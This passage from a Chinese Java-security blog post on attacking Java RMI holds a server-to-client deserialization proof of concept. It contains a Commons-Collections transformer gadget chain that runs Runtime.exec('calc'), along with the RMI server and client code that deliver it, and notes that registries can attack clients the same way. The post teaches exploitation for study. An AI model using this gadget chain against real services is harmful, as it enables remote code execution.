+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">ICalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>ICalcImpl</strong>实现类</li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ICalcImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ICalcImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">ICalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">h</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>RMIServer</strong></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalcImpl</span> <span class="variable">iCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ICalcImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,iCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Server</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><h3 id="Client端-2"><a href="#Client端-2" class="headerlink" title="Client端"></a><strong>Client端</strong></h3></li>
+<li><p><strong>RMIClient</strong></p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">iCalc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        iCalc.ICalc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h3><p>在<strong>Registry</strong>中，除了<strong>unbind</strong>和<strong>rebind</strong>都会返回数据给客户端，返回的数据是序列化形式</p>
+<p>那么到了客户端就会进行反序列化，如果我们能控制<strong>注册中心</strong>的返回数据，那么就能实现对客户端的攻击</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> RMI(二)-攻击</li>
+        <li><strong>作者:</strong> Chiexf</li>
+        <li><strong>创建于:</strong> 2023-09-30 00:00:00</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-10-19 21:22:33
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2023/09/30/Java安全/RMI(二)—攻击/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/RMI/">#RMI</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/09/30/Java%E5%AE%89%E5%85%A8/RMI(%E4%B8%80)%E2%80%94%E5%9F%BA%E7%A1%80/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">RMI(一)-基础</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/09/27/Java%E5%AE%89%E5%85%A8/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Shiro550反序列化(一)</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">RMI(二)-攻击</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-text">0x01 RMI反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F"><span class="nav-text">RMI交互方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#list"><span class="nav-text">list</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lookup"><span class="nav-text">lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind"><span class="nav-text">bind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rebind"><span class="nav-text">rebind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unbind"><span class="nav-text">unbind</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-text">攻击方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="nav-text">0x02 攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BBServer%E7%AB%AF"><span class="nav-text">攻击Server端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ICalc%E6%8E%A5%E5%8F%A3"><span class="nav-text">ICalc接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICalcImpl%E5%AE%9E%E7%8E%B0"><span class="nav-text">ICalcImpl实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMIServer"><span class="nav-text">RMIServer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICalc%E6%8E%A5%E5%8F%A3-1"><span class="nav-text">ICalc接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMIClient"><span class="nav-text">RMIClient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server"><span class="nav-text">Server</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BBregistry%E7%AB%AF"><span class="nav-text">攻击registry端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8bind-rebind%E6%94%BB%E5%87%BB"><span class="nav-text">调用bind&#x2F;rebind攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server%E7%AB%AF%E4%B8%8D%E5%8F%98"><span class="nav-text">Server端不变</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client%E7%AB%AF"><span class="nav-text">Client端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8lookup-unbind%E6%94%BB%E5%87%BB"><span class="nav-text">调用lookup&#x2F;unbind攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server%E4%B8%8D%E5%8F%98"><span class="nav-text">Server不变</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client%E7%AB%AF-1"><span class="nav-text">Client端</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BBClient%E7%AB%AF"><span class="nav-text">攻击Client端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server%E6%94%BB%E5%87%BBClient"><span class="nav-text">Server攻击Client</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server%E7%AB%AF"><span class="nav-text">Server端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client%E7%AB%AF-2"><span class="nav-text">Client端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry%E6%94%BB%E5%87%BBClient"><span class="nav-text">Registry攻击Client</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Chiexf</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
